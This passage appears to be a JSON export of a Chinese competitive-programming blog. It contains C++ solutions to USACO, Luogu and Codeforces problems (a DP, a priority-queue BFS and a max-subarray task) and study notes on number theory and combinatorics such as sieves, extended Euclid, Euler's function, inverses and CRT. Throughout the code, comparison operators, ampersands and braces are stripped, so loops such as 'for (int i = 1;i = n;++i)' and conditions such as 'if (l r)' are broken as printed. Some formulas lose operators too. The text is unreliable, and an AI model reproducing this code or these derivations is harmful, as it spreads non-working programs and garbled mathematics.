str[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) if (str[i] == G) a[i] = a[i - 1] + 1,b[i] = b[i - 1]; else a[i] = a[i - 1],b[i] = b[i - 1] + 1; //前缀和维护一段区间里 G 或 H 的个数 for (int i = 1;i = n;++i) int l = i + 2,r = n,st,end; if (l r) break; while (l = r)//第一次二分找到 l，st = l + 1 int mid = (l + r) 1; if (a[mid] - a[i - 1] == mid - i + 1 || b[mid] - b[i - 1] == mid - i + 1) l = mid + 1; else r = mid - 1; --l; if (l i + 2) st = i + 2;//特殊情况 else st = l + 1; l = st,r = n; while (l = r)//第二次二分找到 end = r int mid = (l + r) 1; if (a[mid] - a[i - 1] == 1 || b[mid] - b[i - 1] == 1) l = mid + 1; else r = mid - 1; --l; end = l; ans += end - st + 1;//累计贡献 printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7995 [USACO21DEC] Walking Home B","path":"/2021/12/25/P7995/","content":"一道很普通的计数 $\\texttt{dp}$。设 $dp_{i,j,k,l}$ 表示在 $(i,j)$ 位置上，还剩下 $k$ 次行走方向改变，当前的方向为 $l$ 时的方案数。因为只能够向下走，则令 $l \\in \\{0,1\\}$ 表示这两种方向。那么显然从起点开始初始化，对于一个草堆的格子，方案数一定为 $0$，对于其它格子，就会有更改方向或不更改方向的两种转移： for (int l = 0;l = k;++l) dp[i][j][0][l] += dp[i][j - 1][0][l]; dp[i][j][1][l] += dp[i - 1][j][1][l];//方向不变 if (l == k) continue;//次数耗尽 dp[i][j][0][l] += dp[i][j - 1][1][l + 1]; dp[i][j][1][l] += dp[i - 1][j][0][l + 1];//更改方向 最后就是答案的统计，根据状态的含义则有 $\\sum_{i = 1}^{K} dp_{n,n,i,0} + dp_{n,n,i,1}$。这样就解决了问题，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 55;const int MOD = 1e9 + 7;inline int read ();int t,n,k,ans,dp[MAX][MAX][2][5];char s[MAX][MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();k = read (); ans = 0; init (dp); for (int i = 1;i = n;++i) scanf (%s,s[i] + 1); if (s[1][2] != H) dp[1][2][0][k] = 1; if (s[2][1] != H) dp[2][1][1][k] = 1; for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) if (i == 1 j == 1) continue; if (i == 1 j == 2) continue; if (i == 2 j == 1) continue; if (s[i][j] == H) continue; for (int l = 0;l = k;++l) dp[i][j][0][l] += dp[i][j - 1][0][l]; dp[i][j][1][l] += dp[i - 1][j][1][l]; if (l == k) continue; dp[i][j][0][l] += dp[i][j - 1][1][l + 1]; dp[i][j][1][l] += dp[i - 1][j][0][l + 1]; for (int i = 0;i = k;++i) ans += dp[n][n][0][i] + dp[n][n][1][i]; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7904 「DCOI」火烧の云","path":"/2021/12/09/P7904/","content":"求起点到终点所花费的最短时间，可以用 bfs 来解决问题。对于一个点，包含四个信息，分别是横纵坐标、当前花费的时间和方向。由题可知，有若干个起点，所以首先把所有起点均加入到队列中去。一共有八种不同的关键字符，一一列举即可，注意判断边界的条件。 # 无法通过，因此直接出队。 S 作为起点，四个方向均可。 E 到达终点，更新答案后出队。 | 与 - 若可以移动，则直行；否则转向，将两个方向的情况加入队列。 / 与 \\ 按照要求转向。注意，在打 \\ 时需要写成 if (str == \\\\) 才能进行判断。 . 会出现三种情况，依次加入队列。 ^,v, 与 均为前进类道路，符合要求时可以前进两个单位。 但是这样还无法通过此题，需要有两个优化。第一个显然是针对重复走的情况，每个格子上记录走到该格子的最短时间，类似于记忆化搜索，只有比当前情况更优时再继续判断加入队列。第二个是用优先队列优化来防止超时，每次出队时优先找出花费时间最小的来继续更新。 哦对了，若答案一直无法被更新，也就是无解的情况，此时要记得特判输出 $-1$。 于是乎，一道大模拟到这里就做好了（害得我交了几十遍，赛时也就因为没有第二个优化一直 $45 \\texttt{pts}$）。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2005;const int MOD = 1e9 + 7;inline int read ();struct node int x,y,cos,dir; bool operator (const node a) const return cos a.cos; //dir 1 2 3 4 N S W E;priority_queue node q;int n,m,a,b,c,d,ans = INF,dis[MAX][MAX][5]; char str[MAX][MAX];int main () n = read ();m = read ();a = read (),b = read (),c = read (),d = read (); for (int i = 1;i = n;++i) scanf (%s,str[i] + 1); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (str[i][j] == S) q.push (i,j,0,1); q.push (i,j,0,2); q.push (i,j,0,3); q.push (i,j,0,4); init (dis); while (!q.empty ()) node now = q.top ();q.pop (); if (now.x 1 || now.x n || now.y 1 || now.y m) continue; if (str[now.x][now.y] == #) continue; if (str[now.x][now.y] == E) ans = min (ans,now.cos); break; if (dis[now.x][now.y][now.dir] = now.cos) continue; dis[now.x][now.y][now.dir] = now.cos; if (now.dir == 1) if (str[now.x][now.y] == S) q.push (now.x - 1,now.y,now.cos,1); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3),q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x,now.y + 1,now.cos + b,4); if (str[now.x][now.y] == \\\\) q.push (now.x,now.y - 1,now.cos + b,3); if (str[now.x][now.y] == .) q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x,now.y + 1,now.cos + c,4); if (str[now.x][now.y] == ) q.push (now.x,now.y - 1,now.cos + d,3); if (str[now.x][now.y] == ) q.push (now.x,now.y + 1,now.cos + d,4); if (str[now.x][now.y] == ^) q.push (now.x - 2,now.y,now.cos,1); if (str[now.x][now.y] == v) ; if (now.dir == 2) if (str[now.x][now.y] == S) q.push (now.x + 1,now.y,now.cos,2); if (str[now.x][now.y] == |) q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3),q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x,now.y - 1,now.cos + b,3); if (str[now.x][now.y] == \\\\) q.push (now.x,now.y + 1,now.cos + b,4); if (str[now.x][now.y] == .) q.push (now.x + 1,now.y,now.cos + c,2),q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x,now.y + 1,now.cos + c,4); if (str[now.x][now.y] == ) q.push (now.x,now.y - 1,now.cos + d,3); if (str[now.x][now.y] == ) q.push (now.x,now.y + 1,now.cos + d,4); if (str[now.x][now.y] == ^) ; if (str[now.x][now.y] == v) q.push (now.x + 2,now.y,now.cos,2); if (now.dir == 3) if (str[now.x][now.y] == S) q.push (now.x,now.y - 1,now.cos,3); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1),q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y - 1,now.cos + a,3); if (str[now.x][now.y] == /) q.push (now.x + 1,now.y,now.cos + b,2); if (str[now.x][now.y] == \\\\) q.push (now.x - 1,now.y,now.cos + b,1); if (str[now.x][now.y] == .) q.push (now.x,now.y - 1,now.cos + c,3),q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x + 1,now.y,now.cos + c,2); if (str[now.x][now.y] == ) q.push (now.x,now.y - 2,now.cos,3); if (str[now.x][now.y] == ) ; if (str[now.x][now.y] == ^) q.push (now.x - 1,now.y,now.cos + d,1); if (str[now.x][now.y] == v) q.push (now.x + 1,now.y,now.cos + d,2); if (now.dir == 4) if (str[now.x][now.y] == S) q.push (now.x,now.y + 1,now.cos,4); if (str[now.x][now.y] == |) q.push (now.x - 1,now.y,now.cos + a,1),q.push (now.x + 1,now.y,now.cos + a,2); if (str[now.x][now.y] == -) q.push (now.x,now.y + 1,now.cos + a,4); if (str[now.x][now.y] == /) q.push (now.x - 1,now.y,now.cos + b,1); if (str[now.x][now.y] == \\\\) q.push (now.x + 1,now.y,now.cos + b,2); if (str[now.x][now.y] == .) q.push (now.x,now.y + 1,now.cos + c,4),q.push (now.x - 1,now.y,now.cos + c,1),q.push (now.x + 1,now.y,now.cos + c,2); if (str[now.x][now.y] == ) ; if (str[now.x][now.y] == ) q.push (now.x,now.y + 2,now.cos,4); if (str[now.x][now.y] == ^) q.push (now.x - 1,now.y,now.cos + d,1); if (str[now.x][now.y] == v) q.push (now.x + 1,now.y,now.cos + d,2); if (ans == INF) printf (-1 ); else printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1359D Yet Another Yet Another Task","path":"/2021/11/25/CF1359D/","content":"由于 $a_i \\in [-30,30]$，所以我们可以考虑枚举区间出现的最大值。由于可以只选一张牌，所以最大得分的最小值为 $0$。 那么我们首先枚举 $i \\in [1,30]$，表示该段区间的最大值为 $i$，然后内层循环求和，即 sum += a[j]。由于最小值为 $0$，所以 sum = max (sum,0) 可以排除掉区间和为负数的情况。又因为第一重循环中已经限制了最大值，所以当出现 a[j] i 的情况时，也要将 sum 更新为 $0$。答案的更新显然有 ans = max (ans,sum - i)，该语句成立的充分条件是序列中出现了 $i$。只需要再用一个数组记录出现数字的情况即可，注意负数的情况（我就是因为这个错误 $\\texttt{RE}$ 了一次 qwq），同时还需要注意该数组在 sum 更新时也要同时更新。 最后来简单看一下代码： #include iostream#include cstdio#define ll long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e7 + 9;inline int read ();int a[MAX],sum,n,ans;bool f[50];int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = 30;++i) sum = 0; for (int j = 1;j = 30;++j) f[j] = 0; for (int j = 1;j = n;++j) sum += a[j]; if (sum 0 || a[j] i) sum = 0,f[i] = 0;//不符合条件就将 sum 置为 0 else if (a[j] 0) f[a[j]] = 1;//标记数字，注意筛去非正数 sum = max (sum,0); if (f[i]) ans = max (ans,sum - i);//i 出现过 printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; 后记。看了别的 $\\texttt{dalao}$ 的题解，发现 f[i] 的设置有些多余，因为即使最大值 $i$ 没有出现，那么相当于被多减，答案一定不会最优。","categories":["Solution"]},{"title":"初级数学 学习笔记","path":"/2021/11/19/Math/","content":"数论基本概念1. 整除法n = ak + r(0 \\le r < a) \\to k = \\lfloor \\frac{n}{a} \\rfloor2. 算数基本定理$p_i$ 为素数，且 $p_i p_{i + 1}$，则有： n = p_1^{a_1} p_2^{a_2} \\cdots p_m ^ {a_m}3. 最大公约数与最小公倍数\\gcd (a,b) \\times \\operatorname{lcm} (a,b) = \\gcd (a,b) \\times \\frac{a \\times b}{\\gcd(a,b)} = a \\times b4. 求一个数的约数个数一个数的每个因子均由若干个素因子构成，第 $i$ 个素因子共有 $i + 1$ 种取法，所以总个数为（$k$ 为素因子的总个数）： \\prod_{i = 1}^{k} (a_i + 1)代码如下： int divisor (int n)//算数基本定理 int tot = 1; for (int i = 2;i * i = n;++i) if (n % i == 0) int cnt = 0; while (n % i == 0) n /= i,++cnt;//素因子i 在 num 中的个数 tot *= (cnt + 1); if (n 1) tot *= 2;//剩下的 n 也为素数的情况 return tot;int divisor_direct (int n)//直接暴力枚举 int cnt = 0; for (int i = 1;i * i = n;++i) if (n % i == 0) ++cnt; if (n / i != i) ++cnt;//完全平方数时会重复计算 return cnt; 素数筛法1. 朴素筛法将每一个数的所有倍数都筛去，时间复杂度为：$O(\\frac{n}{2} + \\frac{n}{3} + \\cdots + 1)$。所以当 $\\lim(n \\to \\infty)$ 时，近似为 $O(n\\log n)$。 2. 常数优化枚举小的那个因子。 for (int i = 2;i * i = n;++i) if (!flag[i]) for (int j = i * i;j = n;j += i) flag[j] = 1; 3. 线性筛时间复杂度为 $O(n)$。 void work (int n)//保证每个数最多被筛一次 for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i;//素数 for (int j = 1;j = cnt;++j) if (i * p[j] n) break;//边界 flag[i * p[j]] = 1;//p[j] 是 i * p[j] 的最小素因子 if (i % p[j] == 0) break;//之后 p[j] 不为 i * p[j] 的最小素因子 //若 p[j] = 2,i = 4，则之后 p[j] = 3,i = 4 不符合条件。否则 12 = 2*6 = 3 * 4 被筛的次数 1 欧几里得算法1. 辗转相减若 $a b$，则 $\\gcd (a,b) = \\gcd (a - b,b)$。 2. 辗转相除若 $a b$，则 $\\gcd (a,b) = \\gcd (b,a \\bmod b)$。 int gcd (int a,int b) if (a b) swap (a,b); return (!b) ? a : gcd (b,a % b); 扩展欧几里得算法由欧几里得算法可知 $ax + by = \\gcd (a,b)$ 一定存在一组解。那么求解 $ax + by = c$ 时，过程如下： ax + by = c(a > b)\\\\\\texttt{设 } ax' + by' = \\gcd (a,b)\\\\\\texttt{则辗转相减知 } (a - b) \\times x_1 + b \\times y_1 = \\gcd (a,b)\\\\\\therefore a \\times x_1 + b \\times (y_1 - x_1) = \\gcd (a,b)\\\\\\therefore x = x_1,y = y_1 - x_1\\\\\\\\\\texttt{由辗转相除代替辗转相减，则有 } b \\times x_1 + a \\bmod b \\times y_1 = \\gcd (a,b)\\\\\\because a \\bmod b = a - \\lfloor \\frac{a}{b} \\rfloor \\times b\\\\\\therefore b \\times x_1 + (a - \\lfloor \\frac{a}{b} \\rfloor \\times b) \\times y_1 = \\gcd (a,b)\\\\\\therefore a \\times y_1 + b \\times (x_1 - \\lfloor \\frac{a}{b} \\rfloor \\times y_1) = \\gcd (a,b)\\\\\\therefore x = y_1,y = x_1 - \\lfloor \\frac{a}{b} \\rfloor \\times y_1不断递归得到 $\\gcd (a,b) \\times x + 0 \\times y = \\gcd (a,b)$，得到特解 $x = 1,y = 0$。 int exgcd (int a,int b,int x,int y) int g = a; if (b) g = exgcd (b,a % b,x,y); x -= (a / b) * y; swap (x,y); else x = 1,y = 0;//一组特解 return g; 设 $k_1 = \\dfrac{a}{\\gcd (a,b)},k_2 = \\dfrac{b} {\\gcd (a,b)}$，显然 $\\gcd (k_1,k_2) = 1$。设 $x,y$ 的最小变化单位是 $d_1,d_2$，则此时 $k_1 = d_2,k_2 = d_1$，所以通解是： \\begin{cases}x = x + k \\times \\dfrac{b}{\\gcd(a,b)}\\\\y = y - k \\times \\dfrac{a}{\\gcd(a,b)}\\\\k \\in \\rm{Z} \\\\\\end{cases}欧拉函数2. 积性函数设 $p$ 为质数，求 $\\phi(p^k)$： \\phi(p^k) = p^k - \\frac{p^k}{p} = p^k - p^{k-1} = (p-1)p^{k-1}同理，对于两个不同质数的乘积 $n = p_1^{a_1} p_2^{a_2}$，由容斥原理： \\begin{aligned} \\phi(p_1^{a_1} p_2^{a_2}) &= p_1^{a_1} p_2^{a_2} - \\frac{p_1^{a_1} p_2^{a_2}}{p_1} - \\frac{p_1^{a_1} p_2^{a_2}}{p_2} + \\frac{p_1^{a_1} p_2^{a_2}}{p_1 p_2} \\\\ &= p_1^{a_1} p_2^{a_2} \\left(1 - \\frac{1}{p_1} - \\frac{1}{p_2} + \\frac{1}{p_1 p_2}\\right) \\\\ &= p_1^{a_1} p_2^{a_2} \\left(1 - \\frac{1}{p_1}\\right)\\left(1 - \\frac{1}{p_2}\\right) \\\\ &= \\phi(p_1^{a_1}) \\times \\phi(p_2^{a_2}) \\end{aligned}因此，欧拉函数是积性函数。 3. 计算通式将 $n$ 进行质因数分解： n = p_1^{a_1} p_2^{a_2} \\cdots p_m^{a_m}由积性函数性质： \\begin{aligned} \\phi(n) &= \\phi(p_1^{a_1}) \\times \\phi(p_2^{a_2}) \\times \\cdots \\times \\phi(p_m^{a_m}) \\\\ &= \\prod_{i=1}^m (p_i - 1)p_i^{a_i-1} \\\\ &= \\prod_{i=1}^m p_i^{a_i} \\times \\frac{p_i - 1}{p_i} \\\\ &= n \\times \\prod_{i=1}^m \\frac{p_i - 1}{p_i} \\end{aligned}这个公式可以直接用于计算任意正整数的欧拉函数值。 5. 代码 根据欧拉函数通式求解。 void work (int n) phi[1] = 1; for (int i = 2;i = n;++i) phi[i] = i;//先标记为自己，方便标记质数，也方便为公式法求解 for (int i = 2;i = n;++i) if (phi[i] == i)//为素数 for (int j = i;j = n;j += i) phi[j] = phi[j] / i * (i - 1);//其中的一个 (pi - 1) / pi 根据线性筛实现 $O(n)$ 的时间复杂度求解。 void work (int n) phi[1] = 1; for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i; phi[i] = i - 1;//素数 p 的欧拉函数为 p - 1 for (int j = 1;j = cnt;++j) if (i * p[j] n) break; flag[i * p[j]] = 1; if (i % p[j] == 0) phi[i * p[j]] = phi[i] * p[j];//若 p 能整除 n / p，则 φ (n) = φ (n / p) * p break; phi[i * p[j]] = phi[i] * (p[j] - 1);//若 p 与 n / p 互质，且 p 为质数，则 φ (n) = φ (n / p) * (p - 1) 利用性质 $f$ 的求解。 void work (int n) for (int i = 1;i = n;++i) phi[i] = i; for (int i = 1;i = n;++i) for (int j = i + i;j = n;j += i) phi[j] -= phi[i];//减去自己所有因子的值即为 φ(i) 欧拉定理如果 $a,n$ 为正整数，且 $\\gcd (a,n) = 1$，则 $a^ {\\phi(n)} ≡ 1 \\pmod n$。 已知 $a,n \\in \\rm{N_{+}}$，且 $\\gcd (a,n) = 1$。求证 $a^{\\phi(n)} \\equiv 1 \\pmod n$。 证明：令集合\\ A = \\{x_1,x_2,\\cdots,x_{\\phi(n)}\\}\\ 来表示所有不大于\\ n\\ 且与其互质的数\\\\再令集合\\ B = \\{ax_1 \\bmod n,ax_2 \\bmod n,\\cdots,ax_{\\phi{n}} \\bmod n\\}\\\\\\because \\gcd (a,n) = 1,\\gcd (x_i,n) = 1\\\\\\therefore \\gcd (ax_i,n) = 1\\\\由欧几里得算法可知\\ \\gcd (ax_i \\bmod n,n) = 1\\\\\\\\假设\\ B\\ 集合中的存在相同元素，即\\ ax_1 = k_1n + b,ax_2 = k_2n + b\\ (0 < x_1,x_2 < n\\ 且\\ \\gcd(a,n) = 1)\\\\则有\\ a(x_1 - x_2) = (k_1 - k_2)b\\\\\\because \\gcd (a,n) = 1\\\\\\therefore x_1 - x_2 = n,k_1 - k_2 = a\\\\\\because 0 < x_1,x_2 < n\\\\\\therefore x_1 - x_2 = n\\ 不成立，与假设矛盾，故\\ B\\ 集合中元素互不相同\\\\\\\\\\therefore A = B\\\\\\therefore a^{\\phi(n)}\\times \\prod_{i = 1}^{\\phi(n)} x_i \\equiv \\prod_{i = 1}^{\\phi(n)} a \\times x_i \\equiv \\prod_{i = 1}^{\\phi(n)} x_i \\pmod n\\\\\\\\\\therefore a^{\\phi(n)} \\equiv 1 \\pmod n乘法逆元1. 费马小定理欧拉定理的特殊情况，当 $n$ 为质数时： \\because \\phi(n) = n - 1\\\\ \\therefore a^{\\phi(n)} = a^{n - 1} \\equiv 1 \\mod n2. 计算$a \\div b \\% c$ 时，假设存在 $p \\times b ≡ 1 \\pmod c$，则 $p$ 为 $b$ 的逆元。$a \\div b \\% c = a \\times p \\% c$。 a \\div b = k \\times c + r\\\\ a = k \\times b \\times c + b \\times r\\\\ \\because p \\times b \\equiv 1 \\pmod c\\\\ \\therefore a \\times p \\equiv k \\times c + r \\pmod c\\\\ \\therefore p \\times b + k \\times c = 1 相当于 $b,c$ 已知，则可以通过扩展欧几里得算法求逆元，但需要 $\\gcd (b,c) = 1$ 时才有解。时间复杂度 $O(n \\log n)$。 int inv (int b,int c) int x,y; exgcd (b,c,x,y); return (x % c + c) % c;//化成正数 当 $c$ 为质数时，逆元可以表示为 $b^{c - 2} \\% c$，直接可以使用快速幂求解。 \\because c \\ 为质数\\\\ \\therefore \\gcd (b,c) = 1\\\\ \\therefore b^{\\phi(c)} \\bmod c = 1\\\\ \\therefore b \\times b^{\\phi(c) - 1} = 1\\\\ 则逆元\\ p= b^{\\phi(c) - 1} = b^{c - 1 - 1} = b^{c - 2}3. 线性求逆元时间复杂度为 $O(n)$。 令\\ p\\ 是质数，则有:\\ inv_i = (p - \\dfrac{p}{i}) \\times inv_{p \\% i} \\bmod p。\\\\ \\\\ 令\\ t = \\dfrac{p}{i},k = p \\% i，则：\\\\ t \\times i + k \\equiv 0 \\pmod p\\\\ -t \\times i \\equiv k \\pmod p\\\\ 同时除以\\ i \\times k\\ 得：\\\\ -t \\times inv_k \\equiv intv_i \\pmod pvoid init (int n,int mod) inv[1] = 1; for (int i = 2;i = n;++i) inv[i] = (p - p / i) * inv[p % i] % p; 4. 无法求逆元的转化\\dfrac{a}{b} \\bmod m = \\dfrac{a \\bmod (b \\times m)}{b}\\\\ \\\\ \\dfrac{a}{b} = k \\times m + x\\ (x < m)\\\\ a = k \\times b \\times m + b \\times x\\\\ a \\bmod (b \\times m) = b \\times x\\\\ \\frac{a \\bmod (b \\times m)}{b} = x中国剩余定理求解以下方程： \\forall m_{i \\mid 1 \\le i \\le n},\\gcd (m_i,m_{i + j}) = 1\\ (1 \\le j \\le n - i)\\\\\\begin{cases}x \\equiv a_1 \\pmod {m_1}\\\\x \\equiv a_2 \\pmod {m_2}\\\\\\cdots\\\\x \\equiv a_n \\pmod {m_n}\\\\\\end{cases}构造答案，设 \\begin{aligned}M &= \\prod_{i = 1}^n m_i, \\quad M_i = \\frac{M}{m_i} \\\\s_i &: \\; M_i \\times s_i \\equiv 1 \\pmod {m_i} \\\\\\because M_i = \\frac{M}{m_i} \\\\\\therefore M_i \\times s_i \\bmod m_j = 0 \\quad (1 \\le j \\le n,\\ j e i) \\\\x &= \\sum_{i = 1}^n a_i \\times M_i \\times s_i \\\\\\text{通解为} x + k \\times M\\end{aligned}所以直接通过 $n$ 次 $\\texttt{exgcd}$ 求出 $s_i$，最后合并即可。 ll CRT (int n,int a[],int m[]) ll M = 1,ans = 0; for (int i = 1;i = n;++i) M *= m[i]; for (int i = 1;i = n;++i) ll x = 0,y = 0; exgcd (M / m[i],m[i],x,y); x = (x % m[i] + m[i]) % m[i]; ans += M / m[i] * x * a[i]; ans %= M; return ans; 整除分块求下列式子的值。 \\sum _{i = 1} ^ n \\lfloor\\dfrac{n}{i}\\rfloor \\ (1 \\le n \\le 10^9)若用朴素的算法，时间复杂度为 $O(n)$，显然会 $\\texttt{TLE}$。那么再给出一种 $O(\\sqrt n)$ 的做法。先给出所有的 $\\lfloor\\dfrac{n}{i}\\rfloor$ 的取值不会超过 $\\sqrt{n}$ 种的证明： 当 \\ i \\le \\sqrt{n} 时，显然取值不超过 \\sqrt{n};\\\\ 当 i > \\sqrt{n} 时，\\lfloor\\dfrac{n}{i}\\rfloor < \\sqrt{n}，故取值不超过 \\sqrt{n}。\\\\ 综上，命题成立。设一段取值均为 $\\lfloor\\dfrac{n}{i}\\rfloor$ 的区间的左、右端点分别为 $L,R$。 \\because \\lfloor\\dfrac{n}{R}\\rfloor \\le \\frac{n}{R}\\\\\\therefore R \\le \\dfrac{n}{\\lfloor\\dfrac{n}{L}\\rfloor}\\\\\\therefore R_{\\max} = \\biggl\\lfloor{\\dfrac{n}{\\lfloor{\\dfrac{n}{L}\\rfloor}}\\biggr\\rfloor}代码如下： for (int L = 1,R;L = n;L = R + 1) R = n / (n / L); ans += 1ll * (R - L * 1) * (n / L); 组合数学基础1. 组合数的两种表示方法 对于递推公式，是对于第 $n$ 项是否选择得出的。 \\tbinom{n}{m} = C^m_n = \\dfrac{n \\times (n - 1) \\times (n - 2) \\cdots \\times (n - m + 1)} {m!} = \\dfrac{n!}{m!(n - m)!}\\\\\\tbinom{n}{m} = \\tbinom{n - 1}{m - 1} + \\tbinom{n - 1}{m}2. 组合数的预处理 void init () c[0][0] = 1; for (int i = 1;i n;++i) c[i][i] = c[i][0] = 1; for (int j = 1;j i;++j) c[i][j] = c[i - 1][j] + c[i - 1][j - 1]; c[i][j] %= MOD; 3. 组合数的变形(1)\\ k \\times \\tbinom{n}{k} = k \\times \\dfrac{n!}{k!(n - k)!}\\\\= k \\times n \\times \\dfrac{(n - 1)!}{k!(n - k)!} = n \\times \\dfrac{(n - 1)!}{(k - 1)!(n - 1 - (k - 1))!} = n \\times \\tbinom{n - 1}{k - 1}\\\\ (2)\\ \\sum_{i = 1}^{n}i \\times \\tbinom{n}{i} = \\sum_{i = 1}^{n} n \\times \\tbinom{n - 1}{i - 1} = n \\times 2^{n - 1}\\\\(3)\\ \\sum_{i = 1}^{n} i^2 \\times \\tbinom{n}{i} = n \\times (n + 1) \\times 2^{n - 2}\\\\(4)\\ \\sum_{i = 0}^{n} \\tbinom{n}{i}^2 = \\tbinom{2n}{n}其中的$(3)$可以转化为模型。等号左边为班级中的 $n$ 个人选择候选人，然后从候选人中选一个班长与副班长，同一个人可以身兼两职，求最终方案数；等号右边为身兼两职与两个人分别当选的两种情况，有加法原理相加得到，即： n \\times 2^{n - 1} + n \\times (n - 1) \\times 2^{n - 2} = n \\times (n + 1) \\times 2^{n - 2}$(4)$ 也一样可以转化为模型。等号右边为班级中有 $n$ 个男生和 $n$ 个女生，从中选 $n$ 人；等号左边相当于等价的，男生选 $i$ 个，女生选 $n - i$ 个，则有： \\sum_{i = 0}^{n} \\tbinom{n}{i} \\times \\tbinom{n}{n - i} = \\sum_{i = 0}^{n} \\tbinom{n}{i}^2 【摘自 CF2077C Binary Subsequence Value Sum题解】 证明 $\\sum_{i=0}^nC_n^ii=n2^{n-1}$$i=C_i^1$，则原式等于 $\\sum_{i=0}^nC_n^iC_i^1$，考虑其组合意义，即先从 $n$ 个元素中选若干个，再从若干个元素里选出一个的方案数。那我们先选这一个，有 $n$ 种方案，再从剩下 $n-1$ 个元素中选出若干个，有 $2^{n-1}$ 种方案，所以是 $n2^{n-1}$。 证明 $\\sum_{i=0}^nC_n^ii^2=n(n+1)2^{n-2}$考虑 $i^2=i+i(i-1)=i+2\\times\\frac{i(i-1)}{2}=C_i^1+2C_i^2$，则原式等于 $\\sum_{i=0}^nC_n^iC_i^1+2C_n^iC_i^2$，等于 $n2^{n-1}+2\\sum_{i=0}^nC_n^iC_i^2$，则我们只需解决 $\\sum_{i=0}^nC_n^iC_i^2$。考虑组合意义，即从 $n$ 个元素里选出若干个，再从若干个元素里选出两个的方案数。那我们先选出这两个，有 $\\frac{n(n-1)}{2}$ 种方案，然后再从剩下的元素中选出若干个，有 $2^{n-2}$ 种方案，所以有 $n(n-1)2^{n-3}$ 种方案。 二项式定理1. 概念对于每一个 $x + y$ 的选择，则选 $i$ 个 $x$，剩余均选择 $y$ 时，答案为： C^i_n x^i y^{n - i} \\ (1 \\le n \\le i)因此有： (x + y)^n = C_n^0 x^n y^0 + C^1_n x^{y - 1} y + C^2_n x^{n - 2} y^2 + \\cdots + C^n_n x^0 y^n\\\\= \\sum_{k = 0}^n \\tbinom{n}{k} x^{n - k}y^k2. 二项式定理的变形(1)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^{n - k}y^k\\\\ (2)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^k y^{n - k}\\\\ (3)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{k} x^k y^{n - k}\\\\ (4)\\ 当\\ y = 1\\ 时，(1 + x)^n = \\sum_{k = 0}^n \\tbinom{n}{k} x^k = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^k\\\\ (5)\\ 当\\ x = 2,y = 1\\ 时，(x + y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i}2^i = 3^n\\\\ (6)\\ 当\\ x = y = 1\\ 时，(x - y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i}2^i \\times (-1)^i= 0\\\\ (7)\\ 当\\ x = y = 1\\ 时，(x + y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i} = 2^n\\\\ (8)\\ \\tbinom{n}{0} + \\tbinom{n}{2} + \\cdots = \\tbinom{n}{1} + \\tbinom{n}{3} + \\cdots = 2^{n - 1}隔板法1. 题意 把 $n$ 个相同的小球，放到 $m$ 个不同的盒子中，盒子不能为空，求方案数。或者求 $x_1 + x_2 + \\cdots + x_m = n$ 的正整数解。 解法 相当于在 $n - 1$ 个间隔中选择 $m - 1$ 个间隔，将其分为 $m$ 份。故为： \\tbinom{n - 1}{m - 1}2. 变式 把 $n$ 个相同的小球，放到 $m$ 个不同的盒子中，盒子可以为空，求方案数。或者求 $x_1 + x_2 + \\cdots + x_m = n$ 的非负整数解。 解法 相当于在先在每个盒子中放入 $1$ 个球，然后求 $n + m$ 个相同的小球放入 $m$ 个不同的盒子的方案数，盒子不能为空。故为： \\tbinom{n + m - 1}{m - 1}错位排列\\forall i \\mid 1 \\le i \\le n,f_i != i递推公式为： f_1 = 